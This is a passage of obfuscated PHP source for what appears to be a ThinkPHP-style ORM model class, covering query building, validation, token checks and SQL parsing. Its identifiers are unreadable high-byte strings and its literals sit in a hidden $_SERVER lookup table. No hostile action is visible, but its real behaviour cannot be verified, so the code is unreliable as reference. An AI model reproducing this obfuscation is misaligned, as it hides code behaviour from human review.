array()) { $≠Õ˝ﬂÀÅ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($ö˜å’º≤) || is_numeric($ö˜å’º≤)) { $ò¿–ÌÃ– = $this->getPk(); if (strpos($ö˜å’º≤, $≠Õ˝ﬂÀÅ[50])) { $‰ÆÍûÎà[$ò¿–ÌÃ–] = array($≠Õ˝ﬂÀÅ[362], $ö˜å’º≤); } else { $‰ÆÍûÎà[$ò¿–ÌÃ–] = $ö˜å’º≤; } $this->options[$≠Õ˝ﬂÀÅ[361]] = $‰ÆÍûÎà; } elseif (!1 === $ö˜å’º≤) { $ö˜å’º≤ = $this->_parseOptions(); return $≠Õ˝ﬂÀÅ[363] . $this->db->buildSelectSql($ö˜å’º≤) . $≠Õ˝ﬂÀÅ[364]; } $ö˜å’º≤ = $this->_parseOptions(); $¢∑Ï∑Å† = $this->db->select($ö˜å’º≤); if (!1 === $¢∑Ï∑Å†) { return !1; } if (empty($¢∑Ï∑Å†)) { return null; } $this->_afterSelect($¢∑Ï∑Å†, $ö˜å’º≤); return $¢∑Ï∑Å†; } protected function _afterSelect(&$Ï¸≤™¢ , $ï¸∞Ï–¿) { } public function buildSql($∞´Ωæµ = array()) { $ﬁ÷ﬁ∫ãù =& $_SERVER[ß⁄ˆÇ†Œ]; $∞´Ωæµ = $this->_parseOptions($∞´Ωæµ); return $ﬁ÷ﬁ∫ãù[363] . $this->db->buildSelectSql($∞´Ωæµ) . $ﬁ÷ﬁ∫ãù[364]; } public function optionsValue($««å≠˚ÿ = null) { if (is_null($««å≠˚ÿ)) { return $this->options; } elseif (is_array($««å≠˚ÿ)) { $this->options = array_merge($this->options, $««å≠˚ÿ); } } protected function _parseOptions($ë¸ﬁÂö· = array()) { $≠˚∏∆≠Û =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_array($ë¸ﬁÂö·)) { $ë¸ﬁÂö· = array_merge($this->options, $ë¸ﬁÂö·); } $this->options = array(); if (!isset($ë¸ﬁÂö·[$≠˚∏∆≠Û[365]])) { $ë¸ﬁÂö·[$≠˚∏∆≠Û[365]] = $this->getTableName(); $ëáØÓÔÜ = $this->fields; } else { $ëáØÓÔÜ = $this->getDbFields(); } if (!empty($ë¸ﬁÂö·[$≠˚∏∆≠Û[366]])) { $ë¸ﬁÂö·[$≠˚∏∆≠Û[365]] .= $≠˚∏∆≠Û[53] . $ë¸ﬁÂö·[$≠˚∏∆≠Û[366]]; } $ë¸ﬁÂö·[$≠˚∏∆≠Û[367]] = $this->name; if (isset($ë¸ﬁÂö·[$≠˚∏∆≠Û[361]]) && is_array($ë¸ﬁÂö·[$≠˚∏∆≠Û[361]]) && !empty($ëáØÓÔÜ) && !isset($ë¸ﬁÂö·[$≠˚∏∆≠Û[368]]) && !isset($ë¸ﬁÂö·[$≠˚∏∆≠Û[365]])) { foreach ($ë¸ﬁÂö·[$≠˚∏∆≠Û[361]] as $¡”œàÿø => $⁄©û¥˚ã) { $¡”œàÿø = trim($¡”œàÿø); if (in_array($¡”œàÿø, $ëáØÓÔÜ, !0)) { if (is_scalar($⁄©û¥˚ã)) { $this->_parseType($ë¸ﬁÂö·[$≠˚∏∆≠Û[361]], $¡”œàÿø); } } elseif (!is_numeric($¡”œàÿø) && $≠˚∏∆≠Û[11] != substr($¡”œàÿø, 0, 1) && !1 === strpos($¡”œàÿø, $≠˚∏∆≠Û[10]) && !1 === strpos($¡”œàÿø, $≠˚∏∆≠Û[346]) && !1 === strpos($¡”œàÿø, $≠˚∏∆≠Û[214]) && !1 === strpos($¡”œàÿø, $≠˚∏∆≠Û[369])) { unset($ë¸ﬁÂö·[$≠˚∏∆≠Û[361]][$¡”œàÿø]); } } } $this->_options_filter($ë¸ﬁÂö·); return $ë¸ﬁÂö·; } protected function _options_filter(&$≠ö ì≠Õ) { } protected function _parseType(&$¨¯úä•‹, $≥èçÈ»Ω) { $Å¥”·åŒ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($this->options[$Å¥”·åŒ[370]][$Å¥”·åŒ[4] . $≥èçÈ»Ω])) { $ƒÑ©¢∞’ = strtolower($this->fields[$Å¥”·åŒ[338]][$≥èçÈ»Ω]); if (!1 !== strpos($ƒÑ©¢∞’, $Å¥”·åŒ[371])) { } elseif (!1 === strpos($ƒÑ©¢∞’, $Å¥”·åŒ[372]) && !1 !== strpos($ƒÑ©¢∞’, $Å¥”·åŒ[373])) { $¨¯úä•‹[$≥èçÈ»Ω] = intval($¨¯úä•‹[$≥èçÈ»Ω]); } elseif (!1 !== strpos($ƒÑ©¢∞’, $Å¥”·åŒ[374]) || !1 !== strpos($ƒÑ©¢∞’, $Å¥”·åŒ[375])) { $¨¯úä•‹[$≥èçÈ»Ω] = floatval($¨¯úä•‹[$≥èçÈ»Ω]); } elseif (!1 !== strpos($ƒÑ©¢∞’, $Å¥”·åŒ[376])) { $¨¯úä•‹[$≥èçÈ»Ω] = (bool) $¨¯úä•‹[$≥èçÈ»Ω]; } } } public function find($âàé‚íÀ = array()) { $∆π˜‹ÄÆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_numeric($âàé‚íÀ) || is_string($âàé‚íÀ)) { $÷«ÅÉª…[$this->getPk()] = intval($âàé‚íÀ); $this->options[$∆π˜‹ÄÆ[361]] = $÷«ÅÉª…; } $this->options[$∆π˜‹ÄÆ[377]] = 1; $âàé‚íÀ = $this->_parseOptions(); $üï’Ê…£ = $this->db->select($âàé‚íÀ); if (!1 === $üï’Ê…£) { return !1; } if (empty($üï’Ê…£)) { return null; } $this->data = $üï’Ê…£[0]; $this->_afterFind($this->data, $âàé‚íÀ); if (!empty($this->options[$∆π˜‹ÄÆ[378]])) { return $this->returnResult($this->data, $this->options[$∆π˜‹ÄÆ[378]]); } return $this->data; } protected function _afterFind(&$‡©œ¸ÿ, $ê∆»èé‘) { } protected function returnResult($Â£êπ€Â, $ÎÖ◊ ﬂÒ = '') { $Ô˚◊∑æ¸ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÎÖ◊ ﬂÒ) { if (is_callable($ÎÖ◊ ﬂÒ)) { return call_user_func($ÎÖ◊ ﬂÒ, $Â£êπ€Â); } switch (strtolower($ÎÖ◊ ﬂÒ)) { case $Ô˚◊∑æ¸[379]: return json_encode($Â£êπ€Â); case $Ô˚◊∑æ¸[380]: return xml_encode($Â£êπ€Â); } } return $Â£êπ€Â; } public function parseFieldsMap($•Øã∂â¢, $ƒ≤âòÄ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ˆ‘ºãŸé => $…‰å£ÉØ) { if ($ƒ≤âòÄ == 1) { if (isset($•Øã∂â¢[$…‰å£ÉØ])) { $•Øã∂â¢[$ˆ‘ºãŸé] = $•Øã∂â¢[$…‰å£ÉØ]; unset($•Øã∂â¢[$…‰å£ÉØ]); } } else { if (isset($•Øã∂â¢[$ˆ‘ºãŸé])) { $•Øã∂â¢[$…‰å£ÉØ] = $•Øã∂â¢[$ˆ‘ºãŸé]; unset($•Øã∂â¢[$ˆ‘ºãŸé]); } } } } return $•Øã∂â¢; } public function setField($∫Ò„É˘ó, $“é¡à˛“ = '') { if (is_array($∫Ò„É˘ó)) { $·„∂∑˘¢ = $∫Ò„É˘ó; } else { $·„∂∑˘¢[$∫Ò„É˘ó] = $“é¡à˛“; } return $this->save($·„∂∑˘¢); } public function setAdd($Ó»Âô·ã, $˝†ëÛÕ§ = 1) { $–„≥˙ï◊ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ñôˆ°µ™ = $Ó»Âô·ã . $–„≥˙ï◊[381] . $˝†ëÛÕ§; if ($˝†ëÛÕ§ < 0) { $Ñôˆ°µ™ = $Ó»Âô·ã . $˝†ëÛÕ§; } return $this->setField($Ó»Âô·ã, array($–„≥˙ï◊[382], $Ñôˆ°µ™)); } public function getField($æôˆ¥·˙, $„–ñ¯ﬂû = null) { $≤¶Èã˙è =& $_SERVER[ß⁄ˆÇ†Œ]; $˜ÿ∫Ìﬁœ[$≤¶Èã˙è[359]] = $æôˆ¥·˙; $˜ÿ∫Ìﬁœ = $this->_parseOptions($˜ÿ∫Ìﬁœ); $æôˆ¥·˙ = trim($æôˆ¥·˙); if (strpos($æôˆ¥·˙, $≤¶Èã˙è[50])) { if (!isset($˜ÿ∫Ìﬁœ[$≤¶Èã˙è[377]])) { $˜ÿ∫Ìﬁœ[$≤¶Èã˙è[377]] = is_numeric($„–ñ¯ﬂû) ? $„–ñ¯ﬂû : $≤¶Èã˙è[12]; } $à⁄ÀùÕ‹ = $this->db->select($˜ÿ∫Ìﬁœ); if (!empty($à⁄ÀùÕ‹)) { $»Ñ“¡™ = explode($≤¶Èã˙è[50], $æôˆ¥·˙); $æôˆ¥·˙ = array_keys($à⁄ÀùÕ‹[0]); $¥„áˆ¸ô = array_shift($æôˆ¥·˙); $˙É˛±§∏ = array_shift($æôˆ¥·˙); $ı≤ó¥Èä = array(); $ÙÆÏÊﬂ— = count($»Ñ“¡™); foreach ($à⁄ÀùÕ‹ as $”Ì«Ú˝ç) { $©◊µÀìÊ = $”Ì«Ú˝ç[$¥„áˆ¸ô]; if (2 == $ÙÆÏÊﬂ—) { $ı≤ó¥Èä[$©◊µÀìÊ] = $”Ì«Ú˝ç[$˙É˛±§∏]; } else { $ı≤ó¥Èä[$©◊µÀìÊ] = is_string($„–ñ¯ﬂû) ? implode($„–ñ¯ﬂû, $”Ì«Ú˝ç) : $”Ì«Ú˝ç; } } return $ı≤ó¥Èä; } } else { if (!0 !== $„–ñ¯ﬂû) { $˜ÿ∫Ìﬁœ[$≤¶Èã˙è[377]] = is_numeric($„–ñ¯ﬂû) ? $„–ñ¯ﬂû : 1; } if ($„–ñ¯ﬂû === $≤¶Èã˙è[341]) { unset($˜ÿ∫Ìﬁœ[$≤¶Èã˙è[377]]); } $”Ì«Ú˝ç = $this->db->select($˜ÿ∫Ìﬁœ); if (!empty($”Ì«Ú˝ç)) { if ($„–ñ¯ﬂû === $≤¶Èã˙è[341]) { return reset($”Ì«Ú˝ç[0]); } if (!0 !== $„–ñ¯ﬂû && 1 == $˜ÿ∫Ìﬁœ[$≤¶Èã˙è[377]]) { return reset($”Ì«Ú˝ç[0]); } foreach ($”Ì«Ú˝ç as $ï¶˝ë§¥) { $îê“≤Âá[] = $ï¶˝ë§¥[$æôˆ¥·˙]; } return $îê“≤Âá; } } return null; } public function create($ê÷ê≈Àô = '', $Ì À‡≥Ú = '') { $√‚≈ˆßá =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($ê÷ê≈Àô)) { $ê÷ê≈Àô = $_POST; } elseif (is_object($ê÷ê≈Àô)) { $ê÷ê≈Àô = get_object_vars($ê÷ê≈Àô); } if (empty($ê÷ê≈Àô) || !is_array($ê÷ê≈Àô)) { $this->error = think_lang($√‚≈ˆßá[357]); return !1; } $ê÷ê≈Àô = $this->parseFieldsMap($ê÷ê≈Àô, 0); $Ì À‡≥Ú = $Ì À‡≥Ú ? $Ì À‡≥Ú : (!empty($ê÷ê≈Àô[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$√‚≈ˆßá[359]])) { $ö‡””åÉ = $this->options[$√‚≈ˆßá[359]]; unset($this->options[$√‚≈ˆßá[359]]); } elseif ($Ì À‡≥Ú == THINK_MODEL_INSERT && isset($this->insertFields)) { $ö‡””åÉ = $this->insertFields; } elseif ($Ì À‡≥Ú == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ö‡””åÉ = $this->updateFields; } if (isset($ö‡””åÉ)) { if (is_string($ö‡””åÉ)) { $ö‡””åÉ = explode($√‚≈ˆßá[50], $ö‡””åÉ); } if (think_config($√‚≈ˆßá[383])) { $ö‡””åÉ[] = think_config($√‚≈ˆßá[384]); } foreach ($ê÷ê≈Àô as $™œΩÓüú => $á©Ò¬ÓÉ) { if (!in_array($™œΩÓüú, $ö‡””åÉ)) { unset($ê÷ê≈Àô[$™œΩÓüú]); } } } if (!$this->autoValidation($ê÷ê≈Àô, $Ì À‡≥Ú)) { return !1; } if (!$this->autoCheckToken($ê÷ê≈Àô)) { $this->error = think_lang($√‚≈ˆßá[385]); return !1; } if ($this->autoCheckFields) { $ö‡””åÉ = $this->getDbFields(); foreach ($ê÷ê≈Àô as $™œΩÓüú => $á©Ò¬ÓÉ) { if (!in_array($™œΩÓüú, $ö‡””åÉ)) { unset($ê÷ê≈Àô[$™œΩÓüú]); } elseif (MAGIC_QUOTES_GPC && is_string($á©Ò¬ÓÉ)) { $ê÷ê≈Àô[$™œΩÓüú] = stripslashes($á©Ò¬ÓÉ); } } } $this->autoOperation($ê÷ê≈Àô, $Ì À‡≥Ú); $this->data = $ê÷ê≈Àô; return $ê÷ê≈Àô; } public function autoCheckToken($Ó¢ÑÛÕ§) { $º¶äçÌﬁ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($this->options[$º¶äçÌﬁ[386]]) && !$this->options[$º¶äçÌﬁ[386]]) { return !0; } if (think_config($º¶äçÌﬁ[383])) { $‹Æﬂıﬂ˛ = think_config($º¶äçÌﬁ[384]); if (!isset($Ó¢ÑÛÕ§[$‹Æﬂıﬂ˛]) || Session::get($‹Æﬂıﬂ˛)) { return !1; } list($Â‹˘õ√, $∏¿⁄·ÖÀ) = explode($º¶äçÌﬁ[11], $Ó¢ÑÛÕ§[$‹Æﬂıﬂ˛]); if ($∏¿⁄·ÖÀ && Session::get($‹Æﬂıﬂ˛ . $º¶äçÌﬁ[10] . $Â‹˘õ√) === $∏¿⁄·ÖÀ) { Session::remove($‹Æﬂıﬂ˛ . $º¶äçÌﬁ[10] . $Â‹˘õ√); return !0; } if (think_config($º¶äçÌﬁ[387])) { Session::remove($‹Æﬂıﬂ˛ . $º¶äçÌﬁ[10] . $Â‹˘õ√); } return !1; } return !0; } public function regex($Ì’≤Ã, $î©ÈÔ˘â) { $ÙËÖ´û =& $_SERVER[ß⁄ˆÇ†Œ]; $ıÆ”–ßã = array($ÙËÖ´û[388] => $ÙËÖ´û[389], $ÙËÖ´û[390] => $ÙËÖ´û[391], $ÙËÖ´û[392] => $ÙËÖ´û[393], $ÙËÖ´û[394] => $ÙËÖ´û[395], $ÙËÖ´û[396] => $ÙËÖ´û[397], $ÙËÖ´û[398] => $ÙËÖ´û[399], $ÙËÖ´û[400] => $ÙËÖ´û[401], $ÙËÖ´û[375] => $ÙËÖ´û[402], $ÙËÖ´û[403] => $ÙËÖ´û[404]); if (isset($ıÆ”–ßã[strtolower($î©ÈÔ˘â)])) { $î©ÈÔ˘â = $ıÆ”–ßã[strtolower($î©ÈÔ˘â)]; } return preg_match($î©ÈÔ˘â, $Ì’≤Ã) === 1; } private function autoOperation(&$ËæÜˆìô, $÷¶˚æÏó) { $§Ë‡’ùì =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($this->options[$§Ë‡’ùì[405]])) { $º˝ˆ¸’√ = $this->options[$§Ë‡’ùì[405]]; unset($this->options[$§Ë‡’ùì[405]]); } elseif (!empty($this->_auto)) { $º˝ˆ¸’√ = $this->_auto; } if (isset($º˝ˆ¸’√)) { foreach ($º˝ˆ¸’√ as $€÷Ë¨Ú°) { if (empty($€÷Ë¨Ú°[2])) { $€÷Ë¨Ú°[2] = THINK_MODEL_INSERT; } if ($÷¶˚æÏó == $€÷Ë¨Ú°[2] || $€÷Ë¨Ú°[2] == THINK_MODEL_BOTH) { switch (trim($€÷Ë¨Ú°[3])) { case $§Ë‡’ùì[406]: case $§Ë‡’ùì[407]: $ÜÌ„Õì∂ = isset($€÷Ë¨Ú°[4]) ? (array) $€÷Ë¨Ú°[4] : array(); if (isset($ËæÜˆìô[$€÷Ë¨Ú°[0]])) { array_unshift($ÜÌ„Õì∂, $ËæÜˆìô[$€÷Ë¨Ú°[0]]); } if ($§Ë‡’ùì[406] == $€÷Ë¨Ú°[3]) { $ËæÜˆìô[$€÷Ë¨Ú°[0]] = call_user_func_array($€÷Ë¨Ú°[1], $ÜÌ„Õì∂); } else { $ËæÜˆìô[$€÷Ë¨Ú°[0]] = call_user_func_array(array(&$this, $€÷Ë¨Ú°[1]), $ÜÌ„Õì∂); } break; case $§Ë‡’ùì[359]: $ËæÜˆìô[$€÷Ë¨Ú°[0]] = $ËæÜˆìô[$€÷Ë¨Ú°[1]]; break; case $§Ë‡’ùì[408]: if ($§Ë‡’ùì[12] === $ËæÜˆìô[$€÷Ë¨Ú°[0]]) { unset($ËæÜˆìô[$€÷Ë¨Ú°[0]]); } break; case $§Ë‡’ùì[409]: default: $ËæÜˆìô[$€÷Ë¨Ú°[0]] = $€÷Ë¨Ú°[1]; } if (!1 === $ËæÜˆìô[$€÷Ë¨Ú°[0]]) { unset($ËæÜˆìô[$€÷Ë¨Ú°[0]]); } } } } return $ËæÜˆìô; } protected function autoValidation($ÒÎ…ã…á, $ÍÆ¿ƒâÃ) { $∆Â⁄•ÅÉ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($this->options[$∆Â⁄•ÅÉ[410]])) { $·ı»ò¶± = $this->options[$∆Â⁄•ÅÉ[410]]; unset($this->options[$∆Â⁄•ÅÉ[410]]); } elseif (!empty($this->_validate)) { $·ı»ò¶± = $this->_validate; } if (isset($·ı»ò¶±)) { if ($this->patchValidate) { $this->error = array(); } foreach ($·ı»ò¶± as $†µ‚‹∑í => $ÀÜæ∆ƒì) { if (empty($ÀÜæ∆ƒì[5]) || $ÀÜæ∆ƒì[5] == THINK_MODEL_BOTH || $ÀÜæ∆ƒì[5] == $ÍÆ¿ƒâÃ) { if (0 == strpos($ÀÜæ∆ƒì[2], $∆Â⁄•ÅÉ[411]) && strpos($ÀÜæ∆ƒì[2], $∆Â⁄•ÅÉ[412])) { $ÀÜæ∆ƒì[2] = think_lang(substr($ÀÜæ∆ƒì[2], 2, -1)); } $ÀÜæ∆ƒì[3] = isset($ÀÜæ∆ƒì[3]) ? $ÀÜæ∆ƒì[3] : THINK_EXISTS_VALIDATE; $ÀÜæ∆ƒì[4] = isset($ÀÜæ∆ƒì[4]) ? $ÀÜæ∆ƒì[4] : $∆Â⁄•ÅÉ[413]; switch ($ÀÜæ∆ƒì[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÒÎ…ã…á, $ÀÜæ∆ƒì)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($∆Â⁄•ÅÉ[12] != trim($ÒÎ…ã…á[$ÀÜæ∆ƒì[0]])) { if (!1 === $this->_validationField($ÒÎ…ã…á, $ÀÜæ∆ƒì)) { return !1; } } break; default: if (isset($ÒÎ…ã…á[$ÀÜæ∆ƒì[0]])) { if (!1 === $this->_validationField($ÒÎ…ã…á, $ÀÜæ∆ƒì)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($·˘∏«√ƒ, $µûÆÔºï) { if (!1 === $this->_validationFieldItem($·˘∏«√ƒ, $µûÆÔºï)) { if ($this->patchValidate) { $this->error[$µûÆÔºï[0]] = $µûÆÔºï[2]; } else { $this->error = $µûÆÔºï[2]; return !1; } } return; } protected function _validationFieldItem($¬ÜôêË¸, $ß≤ûæîâ) { $˙∑–ÓÇÖ =& $_SERVER[ß⁄ˆÇ†Œ]; switch (strtolower(trim($ß≤ûæîâ[4]))) { case $˙∑–ÓÇÖ[406]: case $˙∑–ÓÇÖ[407]: $ëÜ∫’éÁ = isset($ß≤ûæîâ[6]) ? (array) $ß≤ûæîâ[6] : array(); if (is_string($ß≤ûæîâ[0]) && strpos($ß≤ûæîâ[0], $˙∑–ÓÇÖ[50])) { $ß≤ûæîâ[0] = explode($˙∑–ÓÇÖ[50], $ß≤ûæîâ[0]); } if (is_array($ß≤ûæîâ[0])) { foreach ($ß≤ûæîâ[0] as $¬Âõ“—Œ) { $∫·â°∂‘[$¬Âõ“—Œ] = $¬ÜôêË¸[$¬Âõ“—Œ]; } array_unshift($ëÜ∫’éÁ, $∫·â°∂‘); } else { array_unshift($ëÜ∫’éÁ, $¬ÜôêË¸[$ß≤ûæîâ[0]]); } if ($˙∑–ÓÇÖ[406] == $ß≤ûæîâ[4]) { return call_user_func_array($ß≤ûæîâ[1], $ëÜ∫’éÁ); } else { return call_user_func_array(array(&$this, $ß≤ûæîâ[1]), $ëÜ∫’éÁ); } case $˙∑–ÓÇÖ[414]: return $¬ÜôêË¸[$ß≤ûæîâ[0]] == $¬ÜôêË¸[$ß≤ûæîâ[1]]; case $˙∑–ÓÇÖ[415]: if (is_string($ß≤ûæîâ[0]) && strpos($ß≤ûæîâ[0], $˙∑–ÓÇÖ[50])) { $ß≤ûæîâ[0] = explode($˙∑–ÓÇÖ[50], $ß≤ûæîâ[0]); } $ﬂëØ¿Ø“ = array(); if (is_array($ß≤ûæîâ[0])) { foreach ($ß≤ûæîâ[0] as $¬Âõ“—Œ) { $ﬂëØ¿Ø“[$¬Âõ“—Œ] = $¬ÜôêË¸[$¬Âõ“—Œ]; } } else { $ﬂëØ¿Ø“[$ß≤ûæîâ[0]] = $¬ÜôêË¸[$ß≤ûæîâ[0]]; } if (!empty($¬ÜôêË¸[$this->getPk()])) { $ﬂëØ¿Ø“[$this->getPk()] = array($˙∑–ÓÇÖ[416], $¬ÜôêË¸[$this->getPk()]); } if ($this->where($ﬂëØ¿Ø“)->find()) { return !1; } return !0; default: return $this->check($¬ÜôêË¸[$ß≤ûæîâ[0]], $ß≤ûæîâ[1], $ß≤ûæîâ[4]); } } public function check($˝†ˆ⁄ Ç, $ıµïªÁ‰, $ÖË¸¬Äì = "\162\x65\147\145\170") { $œµ¿áá÷ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÖË¸¬Äì = strtolower(trim($ÖË¸¬Äì)); switch ($ÖË¸¬Äì) { case $œµ¿áá÷[7]: case $œµ¿áá÷[417]: $û’√ˆµ» = is_array($ıµïªÁ‰) ? $ıµïªÁ‰ : explode($œµ¿áá÷[50], $ıµïªÁ‰); return $ÖË¸¬Äì == $œµ¿áá÷[7] ? in_array($˝†ˆ⁄ Ç, $û’√ˆµ») : !in_array($˝†ˆ⁄ Ç, $û’√ˆµ»); case $œµ¿áá÷[418]: case $œµ¿áá÷[419]: if (is_array($ıµïªÁ‰)) { $ª¸¸ì ø = $ıµïªÁ‰[0]; $Ü ¢©Œ˝ = $ıµïªÁ‰[1]; } else { list($ª¸¸ì ø, $Ü ¢©Œ˝) = explode($œµ¿áá÷[50], $ıµïªÁ‰); } return $ÖË¸¬Äì == $œµ¿áá÷[418] ? $˝†ˆ⁄ Ç >= $ª¸¸ì ø && $˝†ˆ⁄ Ç <= $Ü ¢©Œ˝ : $˝†ˆ⁄ Ç < $ª¸¸ì ø || $˝†ˆ⁄ Ç > $Ü ¢©Œ˝; case $œµ¿áá÷[420]: case $œµ¿áá÷[421]: return $ÖË¸¬Äì == $œµ¿áá÷[420] ? $˝†ˆ⁄ Ç == $ıµïªÁ‰ : $˝†ˆ⁄ Ç != $ıµïªÁ‰; case $œµ¿áá÷[422]: $ü˙ñ©êÙ = mb_strlen($˝†ˆ⁄ Ç, $œµ¿áá÷[423]); if (strpos($ıµïªÁ‰, $œµ¿áá÷[50])) { list($ª¸¸ì ø, $Ü ¢©Œ˝) = explode($œµ¿áá÷[50], $ıµïªÁ‰); return $ü˙ñ©êÙ >= $ª¸¸ì ø && $ü˙ñ©êÙ <= $Ü ¢©Œ˝; } else { return $ü˙ñ©êÙ == $ıµïªÁ‰; } case $œµ¿áá÷[424]: list($œ≈ˆÁòÁ, $È¿È¸⁄ó) = explode($œµ¿áá÷[50], $ıµïªÁ‰); if (!is_numeric($œ≈ˆÁòÁ)) { $œ≈ˆÁòÁ = strtotime($œ≈ˆÁòÁ); } if (!is_numeric($È¿È¸⁄ó)) { $È¿È¸⁄ó = strtotime($È¿È¸⁄ó); } return NOW_TIME >= $œ≈ˆÁòÁ && NOW_TIME <= $È¿È¸⁄ó; case $œµ¿áá÷[425]: return in_array(get_client_ip(), explode($œµ¿áá÷[50], $ıµïªÁ‰)); case $œµ¿áá÷[426]: return !in_array(get_client_ip(), explode($œµ¿áá÷[50], $ıµïªÁ‰)); case $œµ¿áá÷[413]: default: return $this->regex($˝†ˆ⁄ Ç, $ıµïªÁ‰); } } public function query($õ˚˚◊¥‰, $Ω¶πÜÕ¢ = false) { $≈ı—“∑î =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_bool($Ω¶πÜÕ¢) && !is_array($Ω¶πÜÕ¢)) { $Ω¶πÜÕ¢ = func_get_args(); array_shift($Ω¶πÜÕ¢); } $õ˚˚◊¥‰ = str_replace(array($≈ı—“∑î[262], $≈ı—“∑î[427]), $≈ı—“∑î[53], $õ˚˚◊¥‰); $õ˚˚◊¥‰ = $this->parseSql($õ˚˚◊¥‰, $Ω¶πÜÕ¢); return $this->db->query($õ˚˚◊¥‰); } public function execute($Üâ¨´µ≥, $Å©∂˛ñ‡ = false) { if (!is_bool($Å©∂˛ñ‡) && !is_array($Å©∂˛ñ‡)) { $Å©∂˛ñ‡ = func_get_args(); array_shift($Å©∂˛ñ‡); } $Üâ¨´µ≥ = $this->parseSql($Üâ¨´µ≥, $Å©∂˛ñ‡); return $this->db->execute($Üâ¨´µ≥); } protected function parseSql($ÎÙÊÛ¸⁄, $Èö™©˚‹) { $Êœ˘¨ÿç =& $_SERVER[ß⁄ˆÇ†Œ]; if (!0 === $Èö™©˚‹) { $‹ú„Õü¡ = $this->_parseOptions(); $ÎÙÊÛ¸⁄ = $this->db->parseSql($ÎÙÊÛ¸⁄, $‹ú„Õü¡); } elseif (is_array($Èö™©˚‹)) { $Èö™©˚‹ = array_map(array($this->db, $Êœ˘¨ÿç[428]), $Èö™©˚‹); $ÎÙÊÛ¸⁄ = vsprintf($ÎÙÊÛ¸⁄, $Èö™©˚‹); } else { $ÎÙÊÛ¸⁄ = strtr($ÎÙÊÛ¸⁄, array($Êœ˘¨ÿç[429] => $this->getTableName(), $Êœ˘¨ÿç[430] => think_config($Êœ˘¨ÿç[330]))); } $this->db->setModel($this->name); return $ÎÙÊÛ¸⁄; } public function db($˜ªô∏˘ƒ = '', $å‰ò·±ã = '', $˚–ùÌé = array()) { $å·§Ê≈ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($å·§Ê≈ÿ[12] === $˜ªô∏˘ƒ && $this->db) { return $this->db; } static $∏çﬁ¯Í® = array(); static $¶§î∂“å = array(); if (!isset($¶§î∂“å[$˜ªô∏˘ƒ]) || isset($¶§î∂“å[$˜ªô∏˘ƒ]) && $å‰ò·±ã && $∏çﬁ¯Í®[$˜ªô∏˘ƒ] != $å‰ò·±ã) { if (!empty($å‰ò·±ã) && is_string($å‰ò·±ã) && !1 === strpos($å‰ò·±ã, $å·§Ê≈ÿ[8])) { $å‰ò·±ã = think_config($å‰ò·±ã); } $˜ªô∏˘ƒ = think_guid($å‰ò·±ã); $¶§î∂“å[$˜ªô∏˘ƒ] = Db::getInstance($å‰ò·±ã); } elseif (NULL === $å‰ò·±ã) { $¶§î∂“å[$˜ªô∏˘ƒ]->close(); unset($¶§î∂“å[$˜ªô∏˘ƒ]); return; } if (!empty($˚–ùÌé)) { if (is_string($˚–ùÌé)) { parse_str($˚–ùÌé, $˚–ùÌé); } foreach ($˚–ùÌé as $æÛ‡Èåª => $≈ë•⁄õ) { $this->setProperty($æÛ‡Èåª, $≈ë•⁄õ); } } $∏çﬁ¯Í®[$˜ªô∏˘ƒ] = $å‰ò·±ã; $this->db = $¶§î∂“å[$˜ªô∏˘ƒ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $üœè˜˝ß = get_class($this); if ($üœè˜˝ß == $_SERVER[ß⁄ˆÇ†Œ][431]) { return $this->name; } $this->name = substr($üœè˜˝ß, 0, -5); } return $this->name; } public function getTableName() { $íßÕ™å∑ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($this->trueTableName)) { $¥Úë¿¬ç = !empty($this->tablePrefix) ? $this->tablePrefix : $íßÕ™å∑[12]; if (!empty($this->tableName)) { $¥Úë¿¬ç .= $this->tableName; } else { $¥Úë¿¬ç .= think_parse_name($this->name); } $this->trueTableName = strtolower($¥Úë¿¬ç); } return (!empty($this->dbName) ? $this->dbName . $íßÕ™å∑[10] : $íßÕ™å∑[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $êáó‘»‚ =& $_SERVER[ß⁄ˆÇ†Œ]; return isset($this->fields[$êáó‘»‚[337]]) ? $this->fields[$êáó‘»‚[337]] : $this->pk; } public function getDbFields() { $Ìﬂ»À”π =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($this->options[$Ìﬂ»À”π[365]])) { $˝…ßíÌÓ = $this->db->getFields($this->options[$Ìﬂ»À”π[365]]); return $˝…ßíÌÓ ? array_keys($˝…ßíÌÓ) : !1; } if ($this->fields) { $˝…ßíÌÓ = $this->fields; unset($˝…ßíÌÓ[$Ìﬂ»À”π[336]], $˝…ßíÌÓ[$Ìﬂ»À”π[337]], $˝…ßíÌÓ[$Ìﬂ»À”π[338]], $˝…ßíÌÓ[$Ìﬂ»À”π[335]]); return $˝…ßíÌÓ; } return !1; } public function data($ öê§ñò = '') { $èÌòΩÍ¬ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($èÌòΩÍ¬[12] === $ öê§ñò && !empty($this->data)) { return $this->data; } if (is_object($ öê§ñò)) { $ 